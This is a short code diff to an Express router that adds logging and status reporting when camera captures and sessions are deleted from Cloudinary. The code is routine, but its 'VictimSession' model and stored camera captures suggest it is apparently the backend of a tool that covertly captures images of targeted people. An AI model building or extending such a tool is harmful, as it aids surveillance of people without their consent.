@@ -221,7 +221,8 @@ router.delete('/sessions/:id', async (req, res) => {
     const cameraCaptures = await CameraCapture.find({ sessionId: session._id });
     for (const capture of cameraCaptures) {
       if (capture.cloudinaryPublicId) {
-        await deleteImage(capture.cloudinaryPublicId);
+        const cResult = await deleteImage(capture.cloudinaryPublicId);
+        console.log(`🗑️ Session-delete Cloudinary [${capture.cloudinaryPublicId}]:`, cResult);
       }
     }
 
@@ -417,8 +418,12 @@ router.delete('/camera-captures/:id', async (req, res) => {
     if (!capture) return res.status(404).json({ error: 'Camera capture not found' });
 
     // Delete from Cloudinary if public ID exists
+    let cloudinaryResult = null;
     if (capture.cloudinaryPublicId) {
-      await deleteImage(capture.cloudinaryPublicId);
+      cloudinaryResult = await deleteImage(capture.cloudinaryPublicId);
+      console.log(`🗑️ Deleted from Cloudinary [publicId=${capture.cloudinaryPublicId}]:`, cloudinaryResult);
+    } else {
+      console.warn(`⚠️ Camera capture ${capture._id} has no cloudinaryPublicId`);
     }
 
     // Also remove reference from session
@@ -427,7 +432,11 @@ router.delete('/camera-captures/:id', async (req, res) => {
       { $pull: { cameraImages: capture._id } }
     );
 
-    res.json({ message: 'Camera capture deleted' });
+    res.json({
+      message: 'Camera capture deleted',
+      cloudinaryDeleted: cloudinaryResult?.success || false,
+      note: cloudinaryResult?.reason || null
+    });
   } catch (error) {
     res.status(500).json({ error: error.message });
   }
@@ -446,7 +455,8 @@ router.post('/camera-captures/bulk-delete', async (req, res) => {
     // Delete from Cloudinary and remove references from sessions
     for (const capture of captures) {
       if (capture.cloudinaryPublicId) {
-        await deleteImage(capture.cloudinaryPublicId);
+        const cResult = await deleteImage(capture.cloudinaryPublicId);
+        console.log(`🗑️ Bulk-deleted from Cloudinary [${capture.cloudinaryPublicId}]:`, cResult);
       }
       await VictimSession.updateOne(
         { _id: capture.sessionId },
